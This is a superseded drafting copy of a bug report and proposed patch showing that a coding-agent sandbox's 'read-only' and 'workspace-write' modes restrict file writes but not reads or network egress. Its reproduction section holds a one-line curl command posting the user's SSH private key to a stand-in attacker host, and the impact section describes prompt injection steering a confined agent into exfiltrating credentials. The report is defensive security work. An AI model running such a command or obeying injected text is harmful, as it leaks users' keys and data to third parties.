> **Superseded.** This is the drafting file, not what was posted. The filed
> report was expanded and revised twice for prose after this draft, and the two
> differ by roughly half their content. The canonical copy of discussion #8630
> is [`../research/upstream/BUG-network-egress.md`](../research/upstream/BUG-network-egress.md),
> written directly from the posted body. Kept for the drafting history only.

# Sandbox modes named `read-only` / `workspace-write` do not restrict network egress

**Component:** `packages/sandbox/*` · **Version:** `dsh-v0.2.0-rc.2` (`639ed0153`) · **Platform:** macOS, Linux

---

## Summary

A confined DSH session can read any file the user can read and send it anywhere. `read-only` and
`workspace-write` govern file *writes* only; network egress and file reads are unrestricted. A
prompt-injected agent therefore has a direct exfiltration path, and the mode name suggests the
opposite.

The project already knows this and has left the decision open by design, so this is an offer to
implement it, not an argument about intent.

## Reproduction

In any session under the standing `read-only` policy:

```sh
curl -d @$HOME/.ssh/id_rsa https://attacker.example
```

The command succeeds. So does `nc`, `wget`, or any language runtime opening a socket.

## Evidence

The mode vocabulary states it (`packages/sandbox/sandbox/src/index.ts:24-30`):

> File-effect policy for confined processes. `read-only` permits only required sinks such as
> `/dev/null`; `workspace-write` also permits the workspace and a backend-defined temp area;
> `danger-full-access` bypasses confinement. **Network and process visibility are outside this
> vocabulary.**

The macOS profile grants everything it does not explicitly deny, and it denies only writes
(`packages/sandbox/sandbox-local/src/profiles.ts:52`):

```
(version 1) (allow default) (deny file-write*) (allow file-write* (literal "/dev/null"))
```

Linux never enters a private network namespace. `bwrapProfileArgs` passes `--unshare-pid` for
processes but nothing for the network (`profiles.ts:17`). A grep for
`unshare-net|network_access|deny network` across `packages/sandbox/` and `native/system/` returns no
hits. Landlock grants are file-only by construction.

## Where the project already stands

The design notes name this as an open question awaiting exactly this change
(`.agents/notes/implemented/feature/2026-07-06-sandbox.md:196`):

> **Does the sandbox restrict network or process visibility?** `SandboxMode` claims FILE effects
> only, and no backend claims network. […] Whether network restriction becomes its own knob is left
> open in § The seam.

And § The seam states the open decision directly:

> Left open, for the phase that needs them: **whether network restriction arrives as a separate
> `network_mode` or merges into `sandbox_mode` once a runner enforces both** […]

The companion note is stricter still, and rules out the cheap version of this fix
(`2026-07-14-cross-family-fs-sandbox.md:56`):

> **Network policy for `ctx.web`** — `SandboxMode` claims file effects only; a web-only network knob
> while bash `curl` runs free would be a **false boundary**. Revisit when a bash backend enforces
> network (bwrap `--unshare-net`, Landlock ABI v4+).

That is the right call, and the patch below honours it. The fence goes on the confined *process*,
so it catches `curl`, a language runtime, and every descendant. Putting it on one tool would only
cover today's obvious exfiltration path.

## Impact

Reads and egress are the two halves of exfiltration, and the current fence covers neither. A
confined agent that reads a hostile issue, a dependency README, or a fetched web page can be steered
into sending the user's credentials, source, or SSH keys to a third party, and no DSH layer
intervenes. `workspace-write` is the shipped default for real work, so this is the common path, not
an edge case.

Two things make it worse than it looks:

1. **The mode name is a promise.** A user choosing `read-only` reasonably concludes the agent cannot
   cause harm outside the workspace. The actual guarantee is narrower than the name.
2. **Nothing surfaces the gap.** Nothing in the UI, the permission pickers
   (`packages/interaction/permission-presets/src/index.ts`), or the runtime context the model sees
   mentions that reads and egress are unrestricted.

## Proposed fix

A `network` axis on the policy, defaulting to deny under every confining mode, enforced where a
backend can express it and reported honestly where it cannot. This takes the "separate knob" option
from § The seam instead of merging into `sandbox_mode`. The two axes have different enforceability
per backend, and merging them would force one completeness verdict onto both.

A patch against `639ed0153` is below. The enforcement itself is one flag and one clause:

| File | Change |
|---|---|
| `sandbox/src/index.ts` | `network?: 'deny' \| 'allow'` on `SandboxExecutionPolicy`; `networkEnforcement` on `ConfinedArgv` |
| `sandbox-local/src/profiles.ts` | bwrap: `--unshare-net`. Seatbelt: `(deny network*)` |
| `sandbox-local/src/index.ts` | Per-runner `networkEnforcement`; warn when a selected rung cannot enforce the deny |
| `ssh/sandbox-ssh/src/index.ts` | Relay the new field through the remote facts schema |

Design notes:

- **Absence means deny.** A policy that never mentions the network is confined, so every existing
  call site gets the restriction without being changed.
- **`networkEnforcement` is separate from `enforcement`.** The seam doc defines `enforcement` as the
  completeness the backend achieves for the policy's *file* effects. Landlock governs every file
  effect and cannot touch the network, so reusing the field would make it report `full` for a fence
  it does not have.
- **Explicitly `partial`, not silent.** Landlock is filesystem-only, and the windows-acl restricted
  token does not govern sockets. Both report `partial`, and `confine()` logs a warning when a policy
  denies network but the selected rung cannot enforce it. On a host whose only rung cannot enforce,
  the user finds out. They don't have to infer it.
- **A malformed profile fails loudly, not open.** `sandbox-exec: ` is a registered runner-failure
  signature (`sandbox-local/src/index.ts:240`), so a profile the kernel rejects is classified as
  runner failure and the command never runs.
- **Escape hatch.** `network: 'allow'` restores current behaviour for workflows that need a package
  install or a fetch. An operator-configured `runnerCommand` is wrapped with the bwrap profile, so it
  carries the flag too; whether it honours the flag is the operator's assertion, exactly as for file
  effects.

The patch also adds an opt-out test to `local.spec.ts`, plus end-to-end tests in `seatbelt.e2e.ts`
and `bwrap.e2e.ts`. Those assert the world effect: the connection fails under the default, and the
same command succeeds under `'allow'`. Reading the profile string back would pass even if the kernel
ignored it.

<details>
<summary>The patch</summary>

```diff
$(cat patches/network-fence.patch)
```

</details>

### What is verified and what is not

I want to be precise here. A fence that is assumed instead of tested is worse than none:

- **Verified:** the generated profile arguments, by running the patched `profiles.ts` directly
  (11 assertions: default deny in both profiles, `'allow'` omits it, file mounts unaffected, the
  Seatbelt profile still forms one parseable `-p` argument).
- **Not verified here:** that macOS Seatbelt honours `(deny network*)` in practice, and that
  `--unshare-net` behaves as expected. Both need a host where the sandbox can actually be applied.
  A nested sandbox cannot. The added e2e tests are written to cover exactly this and will run in CI
  or on any macOS host.
- **Not verified:** a full typecheck and test run, for want of an installed checkout.

## Two follow-ups worth considering alongside

- **Tell the user.** Even before the fence lands, the permission-preset descriptions should say that
  `read-only` and `workspace-write` restrict writes only, and that reads and network are
  unrestricted. Right now the only way to learn this is to read the sandbox source.
- **Thread the report to the model.** `networkEnforcement` currently stops at the provider. Carrying
  it into the tool result's existing `sandbox` facts would let the model know when its confinement
  is weaker than the mode implies.

## Related

- `danger-full-access` is unaffected, as intended.
- Windows AppContainer can govern the network where the restricted token cannot; that backend is
  left reporting `partial` instead of claiming a fence it does not have.
